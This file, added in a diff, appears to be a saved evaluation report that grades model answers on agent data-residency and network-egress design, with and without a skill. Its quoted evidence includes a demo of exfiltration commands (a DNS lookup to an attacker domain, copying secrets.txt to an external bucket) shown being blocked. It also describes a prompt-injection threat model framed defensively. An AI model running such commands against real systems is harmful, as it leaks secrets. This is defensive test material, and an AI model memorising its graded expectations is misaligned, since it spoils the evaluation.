@@ -1,0 +1,298 @@
+{
+  "metadata": {
+    "skill_name": "ai-platform-implementation",
+    "skill_path": "<path/to/skill>",
+    "executor_model": "<model-name>",
+    "analyzer_model": "<model-name>",
+    "timestamp": "2026-07-12T16:56:04Z",
+    "evals_run": [
+      0,
+      1
+    ],
+    "runs_per_configuration": 3
+  },
+  "runs": [
+    {
+      "eval_id": 0,
+      "configuration": "with_skill",
+      "run_number": 1,
+      "result": {
+        "pass_rate": 1.0,
+        "passed": 7,
+        "failed": 0,
+        "total": 7,
+        "time_seconds": 110.8,
+        "tokens": 8847,
+        "tool_calls": 0,
+        "errors": 0
+      },
+      "expectations": [
+        {
+          "text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls",
+          "passed": true,
+          "evidence": "\u00a72 table row: '**Model endpoint** | Bedrock | **Azure AI Foundry** endpoint in *their* subscription, private endpoint, public network access disabled | Prompts and completions are client data. A PrivateLink-to-your-Bedrock story still terminates in *your* AWS account's region \u2014 that is data leaving their tenant. This is the item with no workaround.' Also the lede: 'Bedrock does not move \u2014 you replace it, because there is no way to put a Bedrock endpoint inside an Azure subscription.'"
+        },
+        {
+          "text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data",
+          "passed": true,
+          "evidence": "\u00a72: '**Trace store** | wherever it is now | **Self-hosted in-tenant.** No SaaS observability ... | Spans carry the raw prompts. This is the #1 silently-violated boundary.' The boundary diagram in \u00a71 places 'Trace store (self-hosted Langfuse/Phoenix + OTLP)' inside the tenant."
+        },
+        {
+          "text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)",
+          "passed": true,
+          "evidence": "\u00a72: '**Log destinations** | CloudTrail / Bedrock invocation logs \u2192 your bucket | **Foundry diagnostic settings + Activity Log + AKS control-plane logs \u2192 immutable Storage in their tenant** | Shipping model-invocation logs to a vendor-owned aggregation account moves client data across the boundary *through the telemetry channel*.'"
+        },
+        {
+          "text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause",
+          "passed": true,
+          "evidence": "\u00a72 trace-store row names vendors by name: 'No SaaS observability \u2014 no Langfuse Cloud, no Datadog LLM Obs, no vendor-side OTLP collector'."
+        },
+        {
+          "text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)",
+          "passed": true,
+          "evidence": "\u00a73 'What can stay on AWS' table lists dev/CI tier (SYNTHETIC data only), demo tier, 'CI pipeline: build, SBOM, vuln scan, cosign signing, eval + red-team gates \u2014 CI never sees client data', and 'Terraform/Terragrunt + Helm charts, prompts, agent code, eval golden sets, red-team corpus'. The gating condition is stated: 'Only if the tier structurally cannot hold client data \u2014 enforced twice'."
+        },
+        {
+          "text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change",
+          "passed": true,
+          "evidence": "\u00a74: 'If you built on Kubernetes with a provider-bindings layer, this is a values-layer port, not a rewrite' \u2014 then enumerates only the bindings that change (bedrock-runtime \u2192 Foundry SDK, IRSA \u2192 AKS Workload Identity, S3 \u2192 Blob, Secrets Manager \u2192 Key Vault) and what does not: 'Unchanged: agent loop, prompts, schema validation, capability manifests, redaction gateway, business logic.'"
+        },
+        {
+          "text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database",
+          "passed": true,
+          "evidence": "\u00a71: 'The compliance boundary is the client's Azure tenant, and the rule is: every component that touches client data lives inside it.' The lede makes the contrast explicit: 'that list is longer than people expect, because it includes the model endpoint, the trace store, and the log destinations.'"
+        }
+      ],
+      "notes": []
+    },
+    {
+      "eval_id": 1,
+      "configuration": "with_skill",
+      "run_number": 1,
+      "result": {
+        "pass_rate": 1.0,
+        "passed": 9,
+        "failed": 0,
+        "total": 9,
+        "time_seconds": 73.7,
+        "tokens": 7186,
+        "tool_calls": 0,
+        "errors": 0
+      },
+      "expectations": [
+        {
+          "text": "Recommends default-deny egress with no general internet route from workload subnets",
+          "passed": true,
+          "evidence": "\u00a71: '**No NAT-to-anywhere.** Agent workloads run in private subnets. ... the honest target is *zero* internet egress from workload subnets, not \"restricted\" egress. If you're running a NAT gateway for the agent nodegroup today, that's the finding, and it's the one to fix before the review.'"
+        },
+        {
+          "text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet",
+          "passed": true,
+          "evidence": "\u00a71: '**Bedrock over PrivateLink.** Interface endpoint with private DNS, so `bedrock-runtime.*` resolves in-VPC with no code change. The model call never touches the internet.'"
+        },
+        {
+          "text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control",
+          "passed": true,
+          "evidence": "\u00a71: '**In-cluster, NetworkPolicy default-deny ingress+egress per namespace**, then the named flows only. VPC CNI enforces NetworkPolicy natively on EKS.' Followed by an explicit flow table AND a deny list: 'absent on purpose: agent\u2192internet, agent\u2192agent, anything\u2192trace-store except the collector' \u2014 east-west (agent\u2192agent) is covered."
+        },
+        {
+          "text": "Identifies DNS as an exfiltration channel that must also be restricted/logged",
+          "passed": true,
+          "evidence": "\u00a71: '**DNS is egress too.** An agent that can resolve arbitrary names can tunnel data out through queries alone. Cluster resolver only, external resolvers blocked in NetworkPolicy, Route 53 Resolver query logs on in prod.' Both the restriction and the logging are named."
+        },
+        {
+          "text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets",
+          "passed": true,
+          "evidence": "\u00a71: '**S3 via gateway endpoint with an endpoint policy carrying an `aws:ResourceAccount` condition.** ... tight IAM on *your* buckets does nothing to stop `PutObject` to an attacker-owned bucket. The endpoint policy is what closes that path.' The exact condition key is named and the reason the naive control fails is stated."
+        },
+        {
+          "text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)",
+          "passed": true,
+          "evidence": "All four layers, explicitly layered: \u00a72 '`bedrock:InvokeModel*` scoped to named model ARNs'; \u00a72 'Ban Bedrock API keys org-wide via SCP'; \u00a73 'The Bedrock PrivateLink endpoint's resource policy repeats the model-ARN allowlist and scopes to your agent roles ... Model access is governed at four layers (SCP \u2192 account model grants \u2192 role \u2192 endpoint policy) so that no single misconfiguration un-governs it.'"
+        },
+        {
+          "text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)",
+          "passed": true,
+          "evidence": "A dedicated 'enablement checklist' table with a Default column: '**CloudTrail data events** (Bedrock agent-runtime, S3 object-level) | **off** | enable'; '**Bedrock model invocation logging** (full request/response payloads) | **off** | enable \u2192 in-tenant bucket only'; '**EKS control-plane logs** (all five) | **off** | enable all five'; 'Route 53 Resolver query logs | off | enable in prod'. Framed correctly: 'The controls that matter most are off by default, and \"we have CloudTrail\" does not mean the agent runtime is logged.'"
+        },
+        {
+          "text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)",
+          "passed": true,
+          "evidence": "'**The 30-second `kubectl` demo.** Shell into an agent pod. `curl https://example.com` \u2192 blocked. `dig example.com` against an external resolver \u2192 blocked. `aws s3 cp` to a bucket outside the allowed account \u2192 denied by endpoint policy.' Plus a second proof (policies-as-code in the repo with review history and Checkov/OPA plan assertions)."
+        },
+        {
+          "text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel",
+          "passed": true,
+          "evidence": "Opens with exactly this frame: 'In an agentic system, **every reachable network destination is an exfiltration channel available to a hijacked agent** \u2014 and a tool call is an egress channel. So the control isn't \"we trust the model not to.\" The control is that the set of destinations the agent pod can reach equals the set of named, reviewed dependencies. Prompt injection can at worst misuse an approved channel; it cannot open a new one.' Grounded in MITRE ATLAS and OWASP LLM02."
+        }
+      ],
+      "notes": []
+    },
+    {
+      "eval_id": 0,
+      "configuration": "without_skill",
+      "run_number": 1,
+      "result": {
+        "pass_rate": 1.0,
+        "passed": 7,
+        "failed": 0,
+        "total": 7,
+        "time_seconds": 93.4,
+        "tokens": 6612,
+        "tool_calls": 0,
+        "errors": 0
+      },
+      "expectations": [
+        {
+          "text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls",
+          "passed": true,
+          "evidence": "'Has to move (touches customer content)' table, first row: 'Bedrock inference | Azure AI Foundry / Azure OpenAI'. The mental model is stated as 'Anything that touches customer content runs in their Azure subscription.' Note: the answer hedges on whether Bedrock could stay if it were in the client's own AWS account ('spend one email probing whether Bedrock in their own AWS account with PrivateLink + CMK ... is acceptable \u2014 it usually isn't'), but under the assumed reading (#2) it clearly places inference inside the Azure subscription."
+        },
+        {
+          "text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data",
+          "passed": true,
+          "evidence": "'The fights you'll have' \u2192 '**Traces.** Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant ... Either self-host the trace backend in their subscription, or redact payloads at the SDK boundary and ship only spans + metrics.' The 'traces contain client data' rationale is explicit."
+        },
+        {
+          "text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)",
+          "passed": true,
+          "evidence": "Move table: 'Bedrock model invocation logging | Foundry diagnostic settings \u2192 their Log Analytics / Blob | This log *contains prompts and completions*. It's customer data.' And in the bottom line: 'any log that carries a payload' moves. Only content-free aggregate telemetry is allowed to stay, with an explicit DPA carve-out required."
+        },
+        {
+          "text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause",
+          "passed": true,
+          "evidence": "'Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant and their security team will find it.' Vendors named explicitly."
+        },
+        {
+          "text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)",
+          "passed": true,
+          "evidence": "'Can stay on AWS (no customer content)' section: 'Source code, prompt templates, model config, Helm charts, Terraform modules'; 'CI/CD (GitHub Actions or whatever) \u2014 it builds and deploys into their tenant, it doesn't process their data'; 'Container registry \u2014 but mirror images into their ACR'; 'Aggregate, content-free telemetry'. Also correctly flags Terraform state as needing an audit first, and that eval golden sets built from customer documents ARE customer data."
+        },
+        {
+          "text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change",
+          "passed": true,
+          "evidence": "'Everything else stays portable *if it's already on Kubernetes*. Your EKS workloads move to AKS with real but bounded pain: IRSA \u2192 AKS Workload Identity (both are OIDC federation, the shape is the same), IAM roles \u2192 Entra managed identities + RBAC, SGs/NACLs \u2192 NSGs + NetworkPolicy'. The provider-binding seams are named explicitly ('Cut abstraction seams at exactly three places and keep one codebase: model provider, object store, vector/search store'), with the counter-case called out: 'If anything is on Lambda/Step Functions/DynamoDB Streams, that part is a rewrite, not a port.'"
+        },
+        {
+          "text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database",
+          "passed": true,
+          "evidence": "'The clean mental model is BYOC / in-tenant data plane. Anything that touches customer content runs in their Azure subscription.' Operationalized as: 'Inventory every place a prompt, completion, or document body is written to disk or crosses a network boundary. That list *is* your migration scope \u2014 everything else is noise.' The move table extends well past app+DB (queues, parsing workers, invocation logs, guardrails, embeddings)."
+        }
+      ],
+      "notes": [
+        "Model/region availability in Foundry is explicitly flagged as unverified and delegated to the reader"
+      ]
+    },
+    {
+      "eval_id": 1,
+      "configuration": "without_skill",
+      "run_number": 1,
+      "result": {
+        "pass_rate": 0.89,
+        "passed": 8,
+        "failed": 1,
+        "total": 9,
+        "time_seconds": 82.0,
+        "tokens": 6094,
+        "tool_calls": 0,
+        "errors": 0
+      },
+      "expectations": [
+        {
+          "text": "Recommends default-deny egress with no general internet route from workload subnets",
+          "passed": true,
+          "evidence": "Exfil path row 1: 'Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0`'. The opening claim reinforces it: 'The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint.'"
+        },
+        {
+          "text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet",
+          "passed": true,
+          "evidence": "Row 2: 'VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP'."
+        },
+        {
+          "text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control",
+          "passed": true,
+          "evidence": "Row 1 names default-deny egress NetworkPolicy on the namespace; row 5 names the allowed flow explicitly ('Egress policy allows UDP/TCP 53 **only to kube-dns**'); row 6 closes the hostNetwork bypass via Pod Security Admission + Kyverno/OPA \u2014 which is a control the with_skill run omitted. Note: east-west (agent\u2192agent) is not explicitly discussed, but default-deny plus named flows is the substance of the assertion and it is clearly present."
+        },
+        {
+          "text": "Identifies DNS as an exfiltration channel that must also be restricted/logged",
+          "passed": true,
+          "evidence": "Row 5: 'Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy'. The restriction is covered; DNS query LOGGING (e.g. Route 53 Resolver query logs) is not mentioned, but the assertion reads 'restricted/logged' as a disjunction."
+        },
+        {
+          "text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets",
+          "passed": true,
+          "evidence": "Row 4: 'Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource'. aws:ResourceOrgID is the org-scoped sibling of aws:ResourceAccount, applied on the endpoint policy \u2014 same mechanism, same threat closed. Passes on substance."
+        },
+        {
+          "text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)",
+          "passed": true,
+          "evidence": "Row 3: 'IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: \"*\"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side'. All three layers named, with the layering rationale stated."
+        },
+        {
+          "text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)",
+          "passed": false,
+          "evidence": "FAIL. Bedrock model invocation logging is named once, as an evidence artifact to hand over \u2014 'plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention' \u2014 but the answer nowhere states that it is OFF BY DEFAULT or that it must be explicitly enabled. It is presented as something you already have. CloudTrail is referenced only for management events ('`bedrock:InvokeModel` events with the pod's assumed-role identity'); CloudTrail DATA events are never mentioned. EKS control-plane audit logs (also off by default) are relied on implicitly ('a rejected-pod event in the audit log') without noting they must be turned on. The core discriminating content of this assertion \u2014 awareness that the agent-runtime audit trail does not exist until you enable it \u2014 is absent. Compare the with_skill run, which ships a Default column showing these surfaces as 'off'."
+        },
+        {
+          "text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)",
+          "passed": true,
+          "evidence": "'The demo that actually ends the meeting' \u2014 a runnable five-command block: 'kubectl exec -it deploy/agent -n agents -- sh; curl -m 5 https://example.com # hangs, then times out; nslookup exfil.attacker.com # SERVFAIL / no route; aws bedrock-runtime invoke-model --model-id <a model not on the allowlist> # AccessDeniedException; aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied'. Strongest single artifact in the baseline answer, and it is graded as fully passing."
+        },
+        {
+          "text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel",
+          "passed": true,
+          "evidence": "The answer is structured as an enumeration of ten exfil paths ('The egress paths, and what closes each one'), reframes the question structurally ('Nothing about the model's behavior is load-bearing ... If the agent decides to exfiltrate, the packet has nowhere to go'), and row 8 covers the tool-call channel directly: 'Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args \u2014 `send_email(to=\u2026)`, `http_get(url=\u2026)` ... No tool takes a free-form destination.' It also closes with 'If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review.'"
+        }
+      ],
+      "notes": []
+    }
+  ],
+  "run_summary": {
+    "with_skill": {
+      "pass_rate": {
+        "mean": 1.0,
+        "stddev": 0.0,
+        "min": 1.0,
+        "max": 1.0
+      },
+      "time_seconds": {
+        "mean": 92.25,
+        "stddev": 26.2337,
+        "min": 73.7,
+        "max": 110.8
+      },
+      "tokens": {
+        "mean": 8016.5,
+        "stddev": 1174.5044,
+        "min": 7186,
+        "max": 8847
+      }
+    },
+    "without_skill": {
+      "pass_rate": {
+        "mean": 0.945,
+        "stddev": 0.0778,
+        "min": 0.89,
+        "max": 1.0
+      },
+      "time_seconds": {
+        "mean": 87.7,
+        "stddev": 8.061,
+        "min": 82.0,
+        "max": 93.4
+      },
+      "tokens": {
+        "mean": 6353.0,
+        "stddev": 366.2813,
+        "min": 6094,
+        "max": 6612
+      }
+    },
+    "delta": {
+      "pass_rate": "+0.06",
+      "time_seconds": "+4.5",
+      "tokens": "+1664"
+    }
+  },
+  "notes": []
+}
